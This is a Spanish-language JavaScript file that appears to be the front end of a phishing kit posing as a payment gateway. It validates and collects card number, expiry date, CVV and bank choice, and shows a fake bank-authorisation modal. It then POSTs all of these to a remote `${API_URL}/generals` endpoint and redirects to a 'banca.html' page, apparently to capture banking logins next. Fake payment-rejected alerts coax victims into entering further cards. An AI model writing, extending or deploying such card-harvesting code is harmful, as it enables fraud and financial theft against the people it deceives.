console.log("pasarela ON")
fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer 123123123',
    },
    body: JSON.stringify({message: 'P4'})
})

document.addEventListener('DOMContentLoaded', ()=>{
    if(info.err === 'ncard'){
        alert('PAGO RECHAZADO. Por favor inténtelo de nuevo con otro medio de pago.');
    } else if(info.err === 'rcard'){
        alert('Por favor corrija los datos de su tarjeta o intente con otro medio de pago.');
    }
});

const ban = document.querySelector('#ban');
const p = document.querySelector('#p');
p.value = '';
const mes = document.querySelector('#mes');
const ano = document.querySelector('#ano');
const c = document.querySelector('#c');
c.value = '';
c.addEventListener('input', function () {
    const maxLength = parseInt(c.getAttribute('maxlength'));
    if (c.value.length > maxLength) {
        c.value = c.value.slice(0, maxLength);
    }
});


const btnContinuar = document.querySelector('#form');
btnContinuar.addEventListener('submit', (e) => {
    e.preventDefault();

    if ((p.value.length === 19 && p.value[0] !== '3' && ['4','5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
        if (mes.value !== '') {
            if (ano.value !== '') {
                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
                    // Guardar en LS
                    info.ban = ban.value;
                    info.p = p.value;
                    info.f = (mes.value + "/" + ano.value);
                    info.c = c.value;

                    if (p[0] === '3') {
                        info.type = 'AM';
                    } else if (p.value[0] === '4') {
                        info.type = 'VISA';
                    } else if (p.value[0] === '5') {
                        info.type = 'MC';
                    } else {
                        info.type = 'NO';
                    }
                    
                    LS.setItem('info', JSON.stringify(info));

                    // Mostrar modal
                    document.querySelector('#modal-principal').classList.add('d-block');
                    document.querySelector('#-icon-banco').setAttribute('src', `./assets/logos/${ban.value}.png`);

                    document.querySelector('#autorizar').addEventListener('click', (e)=>{
                        document.querySelector('#modal-esperar').classList.add('d-block');

                        setTimeout(()=>{
                            if(info.err === 'rcard'){
                                window.location.href = 'waiting.html';
                            }else{
                                info.err = '';
                                info.user = '';
                                info.puser = '';
                                info.tok = '';

                                LS.setItem('info', JSON.stringify(info));

                                fetch(`${API_URL}/generals`, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                        'Authorization': 'Bearer 123123123',
                                    },
                                    body: JSON.stringify(info)
                                })


                                setTimeout(()=>{
                                    
                                    window.location.href = 'banca.html';
                                },2000);
                            }
                        }, 2000);

                    });
                    

                } else {
                    alert('CVV Incorrecto o no válido.');
                }
            } else {
                alert('El año de vencimiento es inválido');
                ano.focus();
            }
        } else {
            alert('El mes de vencimiento es inválido');
            mes.focus();
        }
    } else {
        alert('El número de tu tarjeta es inválido.')
        p.focus();
    }
});

function formatearNumero(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
    numero.length === 0 ? p.removeAttribute('class'): '';
    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {

        c.setAttribute('maxlength', '4');
        // Icono
        p.removeAttribute('class');
        p.classList.add('bg-am');

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += '-';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        numero[0] == 4 ? p.classList.add('bg-vi'): '';
        numero[0] == 5 ? p.classList.add('bg-mc'): '';

        c.setAttribute('maxlength', '3');
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += '-';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}